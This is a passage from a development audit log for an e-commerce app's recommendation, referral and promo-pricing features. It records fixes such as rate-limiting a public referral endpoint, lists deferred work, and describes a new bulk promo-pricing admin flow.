  - **Deferred:** Tie cache invalidation to a Supabase realtime subscription on `products` table OR shorten TTL on admin-touched pages.
- 🟢 **Backend referral endpoints still solid** — `/create`, `/stats`, `/apply` all have `requireAuth`. Only `/validate` is public, which is correct given the pre-signup use case.

### Fixes Applied
- ✅ `backend/routes/wallet.ts:21-39, 195-223` — Per-IP rate limit on `/api/wallet/referral/validate` (10 req/min, returns 429). Closes a referral-code enumeration vector that was hiding behind the original audit's "endpoints are solid" green light. Endpoint stays public (correct for pre-signup) but bounded.
- ✅ `src/pages/RecommendationsDashboard.tsx:73-88` — "Just for You" section's `page` context switched from `'home'` (collided with "Trending This Week") to `'cart'`. Different cache bucket, semantically appropriate context. Comment documents the rationale for future maintainers.

### Deferred (carry forward)
- Replace `product-recommender.ts:406-455` mock `getAllProducts()` with real Supabase queries — biggest unfixed item; everything else recommender-side cascades from this.
- Wire `getRecommendations()` to actually call `calculateRecommendationScores()` instead of bypassing it.
- Replace fake hardcoded leaderboard in `Referrals.tsx:435-464` with a real query against `referrals` table aggregating per-user counts.
- Show helpful empty-state message in `ProductRecommendations.tsx:137-139` instead of returning null.
- Wire impression / add-to-cart / purchase analytics events.
- Include `currentProduct`, `cartItems`, `excludeIds` in the recommendation cache key.
- Switch referral-code generation to `crypto.randomUUID()`-based 8-char ID + DB unique constraint.
- Cache-invalidate recommendations on product changes.

### Verdict
The big architectural issues (mock data in recommender, fake leaderboard) remain — they need real DB queries that didn't fit a re-audit cycle. Two real fixes did ship: the duplicate "Just for You"/"Trending" cache collision is closed (correct contexts will pay off the moment recommender is wired to real data), and a brute-force vector on the public `/referral/validate` endpoint is now bounded at 10/min/IP. Backend referral side is in better shape than the original audit suggested — `processReferralFirstPurchase` is now wired into order completion, closing one of the original 🟡 items.

---

## Promo Pricing — New feature (2026-04-28)

Out-of-band feature work, not a re-audit. Added a bulk promo-pricing flow:

- Backend `POST /api/admin/products/ai/promo/bulk` with `action: 'apply'|'clear'` semantics. Apply mode preserves the original price into `metadata.original_price` and overwrites `products.price` with the promo. Clear mode restores from metadata. Capped at 200 products per request.
- New `PromoPricingModal` admin component with category filter, search, "active only" toggle, multi-select with "Select all visible", and a flat-promo-price input. Defaults to $15.
- Mounted on `/admin/dashboard` Products tab next to "Create Product" as a 🏷️ button.
- New `src/utils/product-promo.ts` `getPromoBadge()` helper. Reads `metadata.original_price`, returns `{originalPrice, promoPrice, percentOff}` only when active (and tolerates the case where admin manually edited price upward post-promo without clearing metadata — treats that as inactive).
- ProductCard + ProductPage display: original price strikethrough + bold promo price + amber "X% OFF" badge.
- Cart/checkout/payment-intent code unchanged — they already read `product.price` which is now the promo'd value, so the discount carries through automatically with zero plumbing churn.

---
